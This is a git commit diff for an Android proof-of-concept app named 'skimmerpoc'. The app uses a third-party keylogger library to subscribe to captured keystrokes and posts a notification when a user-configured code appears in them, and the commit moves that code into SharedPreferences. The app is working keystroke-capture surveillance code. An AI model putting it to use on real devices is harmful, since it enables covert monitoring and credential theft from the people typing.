cf43d7ceb44eb32cb5c6e9883a0185b58fd3f2ad
Mateus Mourão <mateusm@take.net>
2022-01-11 23:42:48 -0300

    fix monitor code typed

--- app/src/main/java/com/example/skimmerpoc/MainActivity.kt
+++ app/src/main/java/com/example/skimmerpoc/MainActivity.kt
@@ -4,6 +4,7 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
+import android.content.SharedPreferences
 import android.os.Build
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
@@ -11,34 +12,36 @@ import android.util.Log
 import android.view.View
 import android.widget.Button
 import android.widget.EditText
+import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
 import androidx.lifecycle.lifecycleScope
 import com.evilthreads.keylogger.Keylogger
+import kotlinx.android.synthetic.main.activity_main.*
 import kotlinx.coroutines.launch
 import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
+    lateinit var sharedPreferences: SharedPreferences;
+    var codeTyped: String? = null;
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        sharedPreferences = this.getSharedPreferences(
+            "com.example.skimmerpoc",
+            Context.MODE_PRIVATE
+        );
+
         Keylogger.requestPermission(this)
         createNotificationChannel();
-
-        /*val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
-        val monitorButton = findViewById<Button>(R.id.monitorButton);
-
-        monitorButton.setOnClickListener {
-            Log.e("botão", "clicou");
-            val content = codeInputFieldText.text.toString();
-            Log.e("Content retrieved", content);
-        }*/
 
         lifecycleScope.launch {
             Keylogger.subscribe { entry ->
                 var value = entry.toString();
-                if(value.contains("123789")){
+                codeTyped = sharedPreferences.getString("codeTyped", "");
+                if(value.contains(codeTyped.toString())){
                     Log.e("TYPED THE RIGHT CODE", value);
                     var notification = NotificationCompat.Builder(this@MainActivity, "CHANNEL_ID")
                         .setSmallIcon(R.drawable.ic_launcher_background)
@@ -66,7 +69,7 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val name = "My notification channel"
             val descriptionText = "My notification channel description"
-            val importance = NotificationManager.IMPORTANCE_MAX
+            val importance = NotificationManager.IMPORTANCE_HIGH;
             val channel = NotificationChannel("CHANNEL_ID", name, importance).apply {
                 description = descriptionText
             }
@@ -78,10 +81,25 @@ class MainActivity : AppCompatActivity() {
     }
 
     fun onSubmit(view: View){
-        val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+        try {
+            val codeInputFieldText = findViewById<EditText>(R.id.codeInputField);
+            val code = codeInputFieldText.text.toString();
 
-        Log.e("botão", "clicou");
-        val content = codeInputFieldText.text.toString();
-        Log.e("Content retrieved", content);
+            if (code == "") {
+                Toast
+                    .makeText(this, "Digite um código a ser monitorado", Toast.LENGTH_LONG)
+                    .show();
+            } else {
+                sharedPreferences.edit().putString(
+                    "codeTyped", code
+                ).apply();
+            }
+
+            Log.e("botão", "clicou");
+            val content = codeInputFieldText.text.toString();
+            Log.e("Content retrieved", content);
+        } catch (e : Exception) {
+            Log.e("Content retrieved", e.toString());
+        }
     }
 }
